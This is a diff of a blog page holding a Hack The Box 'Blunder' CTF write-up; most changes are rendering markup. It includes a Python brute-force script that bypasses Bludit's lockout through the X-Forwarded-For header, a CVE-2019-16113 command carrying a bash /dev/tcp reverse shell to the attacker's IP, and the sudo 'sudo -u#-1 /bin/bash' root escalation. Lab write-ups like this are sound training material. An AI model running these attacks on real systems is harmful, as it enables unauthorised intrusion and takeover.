@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.83.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.99.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="color-scheme" content="light dark">
 <meta name="supported-color-schemes" content="light dark"><title>HTB Blunder&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.8a20650921066633f421ce7a745e34cd4032f36a72cc46f51a06d1fe62549284c37e461fd23cd89b3f123ccdc212cd1b.css" integrity="sha384-iiBlCSEGZjP0Ic56dF40zUAy82pyzEb1GgbR/mJUkoTDfkYf0jzYmz8SPM3CEs0b"><meta name="twitter:card" content="summary" />
 <meta name="twitter:title" content="HTB Blunder" /><body><section id="header">
@@ -10,7 +10,7 @@
 <p>Blunder is a box that starts with a Bludit based blog being used to store random facts and a Sudoers file was configured with the intent to prevent us from running bash as root. It was less than sucessful.</p>
 <h2 id="scanning-and-enumeration">Scanning and Enumeration</h2>
 <p>We start off with a basic nmap scan.</p>
-<pre><code>sudo nmap  -sV -sC 10.10.10.191                                                                                                                                                                            
+<pre tabindex="0"><code>sudo nmap  -sV -sC 10.10.10.191                                                                                                                                                                            
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 08:44 MDT                                                                       
 Nmap scan report for 10.10.10.191                                                                                                     
 Host is up (0.11s latency).                                                                                                           
@@ -31,7 +31,7 @@ That leaves us with port 80. Seems to be running a web page, a &ldquo;Blunder of
 <p><code>/admin</code> is a takes us to a bludit CMS login. We try to find and login with default credentials but are unsuccessful. We are however able to find
 the version is Bludit 3.2, which will be useful latter.</p>
 <p>We then check out <code>/todo.txt</code> and find some rather helpful information.</p>
-<pre><code>-Update the CMS
+<pre tabindex="0"><code>-Update the CMS
 -Turn off FTP - DONE
 -Remove old users - DONE
 -Inform fergus that the new blog needs images - PENDING
@@ -39,62 +39,64 @@ the version is Bludit 3.2, which will be useful latter.</p>
 <p>Now we know that FTP being inaccessible is intentional. Old users might be referring to the default login details we tried so also not too helpful.
 &ldquo;fergus&rdquo; though. That is interesting. Maybe that happens to be a username we can use to log in? With no password at hand, we are left to try and
 bruteforce our way in. Unfortunately, if we just try passwords over and over with our just discovered username we shortly end up blocked. :-(</p>
-<p>At this point we start googling and we discover there is in fact a vulnerability in how Bludit detects bruteforcing. (<a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">https://rastating.github.io/bludit-brute-force-mitigation-bypass/</a>) Specifically, it trusts the Client-IP header
+<p>At this point we start googling and we discover there is in fact a vulnerability in how Bludit detects bruteforcing. (<a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/"target="_blank" rel="noopener noreferrer">https://rastating.github.io/bludit-brute-force-mitigation-bypass/</a>
+) Specifically, it trusts the Client-IP header
 of a request to be accurate enabling it to block request from IPs it determines to be malicious. The problem? We can alter that header.</p>
 <p>This was patched in a Bludit 3.9.3. However, our target is Bludit 3.9.2 and still vulnerable. Now that we have a way to not get locked out, we just need a wordlist.</p>
 <p>We make use of a handy tool called Cewl in order to create a custom wordlist to. We then plug it in to our script and let it loose. (I have removed the wordlist to keep you from having to scroll forever.)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
-<span style="color:#f92672">import</span> re
-<span style="color:#f92672">import</span> requests
-
-host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://10.10.10.191&#39;</span>
-login_url <span style="color:#f92672">=</span> host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/admin/login&#39;</span>
-username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;fergus&#39;</span>
-wordlist <span style="color:#f92672">=</span> [Custom Wordlist goes here]
-
-<span style="color:#75715e"># Generate 50 incorrect passwords</span>
-<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
-    wordlist<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;Password{i}&#39;</span><span style="color:#f92672">.</span>format(i <span style="color:#f92672">=</span> i))
-
-<span style="color:#75715e"># Add the correct password to the end of the list</span>
-wordlist<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;adminadmin&#39;</span>)
-
-<span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> wordlist:
-    session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
-    login_page <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(login_url)
-    csrf_token <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span>, login_page<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
-
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[*] Trying: {p}&#39;</span><span style="color:#f92672">.</span>format(p <span style="color:#f92672">=</span> password))
-
-    headers <span style="color:#f92672">=</span> {
-        <span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: password,
-        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span>,
-        <span style="color:#e6db74">&#39;Referer&#39;</span>: login_url
-    }
-
-    data <span style="color:#f92672">=</span> {
-        <span style="color:#e6db74">&#39;tokenCSRF&#39;</span>: csrf_token,
-        <span style="color:#e6db74">&#39;username&#39;</span>: username,
-        <span style="color:#e6db74">&#39;password&#39;</span>: password,
-        <span style="color:#e6db74">&#39;save&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>
-    }
-
-    login_result <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(login_url, headers <span style="color:#f92672">=</span> headers, data <span style="color:#f92672">=</span> data, allow_redirects <span style="color:#f92672">=</span> False)
-
-    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;location&#39;</span> <span style="color:#f92672">in</span> login_result<span style="color:#f92672">.</span>headers:
-        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;/admin/dashboard&#39;</span> <span style="color:#f92672">in</span> login_result<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;location&#39;</span>]:
-            <span style="color:#66d9ef">print</span>()
-            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;SUCCESS: Password found!&#39;</span>)
-            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Use {u}:{p} to login.&#39;</span><span style="color:#f92672">.</span>format(u <span style="color:#f92672">=</span> username, p <span style="color:#f92672">=</span> password))
-            <span style="color:#66d9ef">print</span>()
-            <span style="color:#66d9ef">break</span>
-
-</code></pre></div><p>We run the script and not long after, we have password. <code>RolandDeschain</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://10.10.10.191&#39;</span>
+</span></span><span style="display:flex;"><span>login_url <span style="color:#f92672">=</span> host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/admin/login&#39;</span>
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;fergus&#39;</span>
+</span></span><span style="display:flex;"><span>wordlist <span style="color:#f92672">=</span> [Custom Wordlist goes here]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Generate 50 incorrect passwords</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
+</span></span><span style="display:flex;"><span>    wordlist<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;Password</span><span style="color:#e6db74">{i}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(i <span style="color:#f92672">=</span> i))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add the correct password to the end of the list</span>
+</span></span><span style="display:flex;"><span>wordlist<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;adminadmin&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> wordlist:
+</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>    login_page <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(login_url)
+</span></span><span style="display:flex;"><span>    csrf_token <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span>, login_page<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;[*] Trying: </span><span style="color:#e6db74">{p}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(p <span style="color:#f92672">=</span> password))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: password,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Referer&#39;</span>: login_url
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;tokenCSRF&#39;</span>: csrf_token,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;username&#39;</span>: username,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;password&#39;</span>: password,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;save&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    login_result <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(login_url, headers <span style="color:#f92672">=</span> headers, data <span style="color:#f92672">=</span> data, allow_redirects <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;location&#39;</span> <span style="color:#f92672">in</span> login_result<span style="color:#f92672">.</span>headers:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;/admin/dashboard&#39;</span> <span style="color:#f92672">in</span> login_result<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;location&#39;</span>]:
+</span></span><span style="display:flex;"><span>            print()
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;SUCCESS: Password found!&#39;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#39;Use </span><span style="color:#e6db74">{u}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{p}</span><span style="color:#e6db74"> to login.&#39;</span><span style="color:#f92672">.</span>format(u <span style="color:#f92672">=</span> username, p <span style="color:#f92672">=</span> password))
+</span></span><span style="display:flex;"><span>            print()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span></code></pre></div><p>We run the script and not long after, we have password. <code>RolandDeschain</code></p>
 <h2 id="shell">Shell</h2>
 <p>It&rsquo;s now time to take a crack at getting a shell. We have credentials which opens the  opportunity for us to make use of CVE-2019-16113, which allows for the upload and execution
-of arbitrary PHP code. There is a Metasploit module however it is also easy enough to find a separate PoC such as this one. <a href="https://github.com/cybervaca/CVE-2019-16113">https://github.com/cybervaca/CVE-2019-16113</a></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 CVE-2019-16113-master/CVE-2019-16113.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c <span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.15/7331 0&gt;&amp;1&#39;&#34;</span>
-</code></pre></div><p>We catch our shell and attempt to stabilize it. I used PwnCat, which is a cool little project put together by Caleb Stewart and John Hammond. There is a GitHub and a talk recorded from GrimmCon that I highly recommend you check out. <a href="https://github.com/calebstewart/pwncat">https://github.com/calebstewart/pwncat</a></p>
+of arbitrary PHP code. There is a Metasploit module however it is also easy enough to find a separate PoC such as this one. <a href="https://github.com/cybervaca/CVE-2019-16113"target="_blank" rel="noopener noreferrer">https://github.com/cybervaca/CVE-2019-16113</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 CVE-2019-16113-master/CVE-2019-16113.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c <span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.15/7331 0&gt;&amp;1&#39;&#34;</span>
+</span></span></code></pre></div><p>We catch our shell and attempt to stabilize it. I used PwnCat, which is a cool little project put together by Caleb Stewart and John Hammond. There is a GitHub and a talk recorded from GrimmCon that I highly recommend you check out. <a href="https://github.com/calebstewart/pwncat"target="_blank" rel="noopener noreferrer">https://github.com/calebstewart/pwncat</a>
+</p>
 <p><code>pwncat -l -p 7331</code></p>
 <h2 id="usertxt">User.txt</h2>
 <p>Some quick enumeration shows that we are www-data and don&rsquo;t seem to have any low hanging fruit in reach. We are able to find user.txt in /home/hugo but we lack the
@@ -109,13 +111,14 @@ the whole time.</p>
 <p>We try to su to hugo and are successful! We claim user.txt and head on to root.</p>
 <h2 id="roottxt">Root.txt</h2>
 <p>We start some basic enumeration and find that we are specifically <em>not</em> allowed to run /bin/bash as root. Very unfortunate.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> /bin/bash
-</code></pre></div><p>However, there is a rather nasty bug. This box has a sudo version vulnerable to CVE-2019-14287. (<a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a>) From the description,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> <span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> /bin/bash
+</span></span></code></pre></div><p>However, there is a rather nasty bug. This box has a sudo version vulnerable to CVE-2019-14287. (<a href="https://www.exploit-db.com/exploits/47502"target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/47502</a>
+) From the description,
 &ldquo;Sudo doesn&rsquo;t check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
 -u#-1 returns as 0 which is root&rsquo;s id&rdquo;</p>
 <p>We run,</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u#-1 /bin/bash
-</code></pre></div><p>And just like that we are root.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -u#-1 /bin/bash
+</span></span></code></pre></div><p>And just like that we are root.</p>
 <h2 id="mitigation">Mitigation</h2>
 <p>Here are some things that could have prevented this box form being compromised in a real world scenario.</p>
 <ul>
